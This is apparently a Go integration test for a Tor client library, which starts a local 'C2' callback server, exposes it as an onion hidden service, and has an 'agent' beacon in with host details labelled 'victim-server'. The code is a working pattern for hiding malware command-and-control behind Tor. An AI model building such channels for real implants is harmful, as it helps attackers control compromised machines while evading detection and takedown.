//go:build integration
// +build integration

package integration

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"gitlab.torproject.org/cerberus-droid/torgo/src/app/config"
	"gitlab.torproject.org/cerberus-droid/torgo/src/core"
	hsv3 "gitlab.torproject.org/cerberus-droid/torgo/src/feature/hs"
	"go.uber.org/zap"
	"golang.org/x/net/proxy"
)

func TestBackConnectPayload_RealTorNetwork(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping integration test in short mode")
	}

	dataDir := filepath.Join(os.TempDir(), "hades-backconnect-test", fmt.Sprintf("test-%d", time.Now().UnixNano()))
	if err := os.MkdirAll(dataDir, 0700); err != nil {
		t.Fatalf("failed to create data dir: %v", err)
	}
	defer os.RemoveAll(dataDir)

	logger, _ := zap.NewProduction()

	socksPort := int(19800 + (time.Now().UnixNano() % 100))
	controlPort := int(19801 + (time.Now().UnixNano() % 100))
	c2Port := int(1666 + (time.Now().UnixNano() % 10))
	fmt.Printf("Using ports: SOCKS=%d, Control=%d, C2=%d\n", socksPort, controlPort, c2Port)

	cfg := &config.Config{
		SocksPort:      socksPort,
		ControlPort:    controlPort,
		DataDirectory:  dataDir,
		LogLevel:       "info",
		BandwidthRate:  10 * 1024 * 1024,
		BandwidthBurst: 20 * 1024 * 1024,
		NumCPUs:        2,
		ConnLimit:      512,
		ClientOnly:     true,
		AIEnabled:      true,
		Control: config.ControlConfig{
			Enabled:    true,
			Addr:       fmt.Sprintf("127.0.0.1:%d", controlPort),
			AuthMethod: "none",
		},
	}

	cfg.DirAuthority = []string{
		"moria1 80 128.31.0.39:9231 F533C81CEF0BC0267857C99B2F471ADF249FA232",
	}

	fmt.Println("=====================================================")
	fmt.Println("  Back-Connect Payload via Real Tor + HSv3")
	fmt.Println("=====================================================")

	fmt.Println("\n[1] Starting torgo with AI Circuit Manager...")

	tor, err := core.NewTorWithConfig(cfg, logger)
	if err != nil {
		t.Fatalf("failed to create Tor instance: %v", err)
	}

	if err := tor.Start(); err != nil {
		t.Fatalf("failed to start Tor: %v", err)
	}
	defer tor.Stop()

	fmt.Println("Waiting for Tor to bootstrap...")
	for i := 0; i < 120; i++ {
		status := tor.Status().String()
		fmt.Printf("[%ds] Tor status: %s\n", i, status)
		if status == "running" {
			fmt.Println("Tor is running")
			break
		}
		if i == 119 {
			t.Fatalf("Tor failed to start after 120 seconds, status: %s", status)
		}
		time.Sleep(1 * time.Second)
	}

	relayCount := len(tor.GetDirectory().GetConsensus().Descriptors)
	fmt.Printf("  Loaded %d relays from real Tor consensus\n", relayCount)
	if relayCount == 0 {
		t.Fatalf("No relays loaded - Tor bootstrap failed")
	}

	aiMgr := tor.GetAICircuitManager()
	if aiMgr != nil {
		stats := aiMgr.GetStats()
		fmt.Printf("  AI Circuits built: %d\n", stats.AICircuits)
		fmt.Printf("  Learning records: %d\n", aiMgr.GetLearningStats().TotalRecords)
	}

	fmt.Println("\n[2] Setting up SOCKS dialer...")

	socksDialer, err := proxy.SOCKS5("tcp", fmt.Sprintf("127.0.0.1:%d", socksPort), nil, proxy.Direct)
	if err != nil {
		t.Fatalf("failed to create SOCKS dialer: %v", err)
	}

	fmt.Println("\n[3] Verifying Tor connection via check.torproject.org...")

	checkClient := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return socksDialer.Dial(network, addr)
			},
		},
	}

	checkCtx, checkCancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer checkCancel()

	checkReq, _ := http.NewRequestWithContext(checkCtx, "GET", "https://check.torproject.org/api/ip", nil)
	checkResp, err := checkClient.Do(checkReq)
	if err != nil {
		t.Fatalf("check.torproject.org failed: %v", err)
	}
	defer checkResp.Body.Close()

	checkBody, _ := io.ReadAll(checkResp.Body)
	var ipResp map[string]interface{}
	json.Unmarshal(checkBody, &ipResp)

	fmt.Printf("  IsTor: %v\n", ipResp["IsTor"])
	fmt.Printf("  IP: %v\n", ipResp["IP"])
	if ipResp["IsTor"] != true {
		t.Fatalf("Tor verification failed: IsTor=%v", ipResp["IsTor"])
	}
	fmt.Printf("  SUCCESS: torgo is connected to real Tor network!\n")

	fmt.Println("\n[4] Starting C2 callback server...")

	var registeredAgents []string
	var mu sync.Mutex

	mux := http.NewServeMux()
	mux.HandleFunc("/api/callback", func(w http.ResponseWriter, r *http.Request) {
		var req struct {
			AgentID  string `json:"agent_id"`
			Hostname string `json:"hostname"`
			OS       string `json:"os"`
			IP       string `json:"ip"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		mu.Lock()
		registeredAgents = append(registeredAgents, req.AgentID)
		mu.Unlock()
		fmt.Printf("  [CALLBACK] Agent: %s, Hostname: %s, OS: %s\n", req.AgentID, req.Hostname, req.OS)

		resp := map[string]string{
			"status":  "connected",
			"agent":   req.AgentID,
			"message": "Callback successful via Tor HSv3!",
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	})

	c2Addr := fmt.Sprintf("127.0.0.1:%d", c2Port)
	srv := &http.Server{Addr: c2Addr, Handler: mux}
	ln, err := net.Listen("tcp", c2Addr)
	if err != nil {
		t.Fatalf("failed to start C2 server: %v", err)
	}
	go srv.Serve(ln)
	defer srv.Shutdown(context.Background())

	time.Sleep(500 * time.Millisecond)

	fmt.Println("\n[5] Creating C2 hidden service (HSv3)...")

	hsDir := filepath.Join(dataDir, "c2-onion-service")
	if err := os.MkdirAll(hsDir, 0700); err != nil {
		t.Fatalf("failed to create HS dir: %v", err)
	}

	ports := []hsv3.ServicePort{{
		VirtualPort:   80,
		TargetPort:    uint16(c2Port),
		TargetAddress: "127.0.0.1",
	}}

	svc, err := tor.CreateHiddenService(ports, &hsv3.ServiceOptions{
		ServiceDir: hsDir,
		Version:    3,
	})
	if err != nil {
		t.Fatalf("failed to create hidden service: %v", err)
	}

	fmt.Printf("  HS service created, ID: %s\n", svc.ServiceID)

	fmt.Println("  Starting hidden service (establishing intro points)...")

	if err := tor.StartHiddenService(svc.ServiceID); err != nil {
		t.Logf("  StartHiddenService warning: %v", err)
	}

	fmt.Println("  Waiting for hostname file to appear...")

	hostnameFile := filepath.Join(hsDir, "hostname")
	onionAddr := ""
	for i := 0; i < 90; i++ {
		data, err := os.ReadFile(hostnameFile)
		if err == nil && len(data) > 0 {
			onionAddr = strings.TrimSpace(string(data))
			break
		}
		time.Sleep(2 * time.Second)
		fmt.Printf("    Waiting... %ds elapsed\n", i*2)
	}

	if onionAddr == "" {
		t.Fatalf("failed to get onion address from hostname file after 180s")
	}
	fmt.Printf("  C2 onion address ready: %s\n", onionAddr)

	fmt.Println("\n[6] Agent connecting to C2 via HSv3 .onion address...")

	httpClient := &http.Client{
		Timeout: 60 * time.Second,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return socksDialer.Dial(network, addr)
			},
		},
	}

	agentID := fmt.Sprintf("agent-%d", time.Now().Unix())

	callbackPayload := map[string]interface{}{
		"agent_id":  agentID,
		"hostname":  "victim-server",
		"os":        "linux-5.15.0-amd64",
		"ip":        "10.0.0.5",
		"timestamp": time.Now().Unix(),
	}

	payloadJSON, _ := json.Marshal(callbackPayload)

	fmt.Printf("  Agent ID: %s\n", agentID)
	fmt.Printf("  C2 Address: %s\n", onionAddr)
	fmt.Printf("  Connecting through AI-selected Tor circuits...\n")

	callbackCtx, callbackCancel := context.WithTimeout(context.Background(), 90*time.Second)
	defer callbackCancel()

	callbackReq, err := http.NewRequestWithContext(callbackCtx, "POST", fmt.Sprintf("http://%s/api/callback", onionAddr), strings.NewReader(string(payloadJSON)))
	if err != nil {
		t.Fatalf("failed to create request: %v", err)
	}
	callbackReq.Header.Set("Content-Type", "application/json")
	callbackReq.Header.Set("User-Agent", "HadesAgent/1.0 (Tor)")

	start := time.Now()
	callbackResp, err := httpClient.Do(callbackReq)
	elapsed := time.Since(start)

	if err != nil {
		t.Fatalf("Callback failed: %v", err)
	}
	defer callbackResp.Body.Close()

	callbackBody, _ := io.ReadAll(callbackResp.Body)

	if callbackResp.StatusCode != http.StatusOK {
		t.Fatalf("Callback returned status %d: %s", callbackResp.StatusCode, string(callbackBody))
	}

	var callbackData map[string]string
	json.Unmarshal(callbackBody, &callbackData)

	fmt.Printf("  [SUCCESS] Callback connected!\n")
	fmt.Printf("  Status: %s\n", callbackData["status"])
	fmt.Printf("  Message: %s\n", callbackData["message"])
	fmt.Printf("  Response time: %v\n", elapsed)

	mu.Lock()
	agentCount := len(registeredAgents)
	mu.Unlock()

	fmt.Println("\n[7] AI Circuit Manager Final Stats...")

	if aiMgr != nil {
		stats := aiMgr.GetStats()
		fmt.Printf("  Total Circuits Built: %d\n", stats.TotalCircuits)
		fmt.Printf("  AI Circuits: %d\n", stats.AICircuits)
		fmt.Printf("  Fallback Circuits: %d\n", stats.FallbackCircuits)
		if stats.TotalCircuits > 0 {
			successRate := float64(stats.SuccessfulCircuits) / float64(stats.TotalCircuits) * 100
			fmt.Printf("  Success Rate: %.1f%%\n", successRate)
		}
	}

	fmt.Println("\n=====================================================")
	fmt.Printf("  BACK-CONNECT TEST SUCCESSFUL!\n")
	fmt.Printf("  Agent ID: %s\n", agentID)
	fmt.Printf("  C2 Address: %s\n", onionAddr)
	fmt.Printf("  Via: Real Tor + HSv3 (%d relays)\n", relayCount)
	fmt.Printf("  Circuit: AI-selected 3-hop path\n")
	fmt.Printf("  Callbacks registered: %d\n", agentCount)
	fmt.Printf("  Total Time: %v\n", elapsed)
	fmt.Println("=====================================================")
}
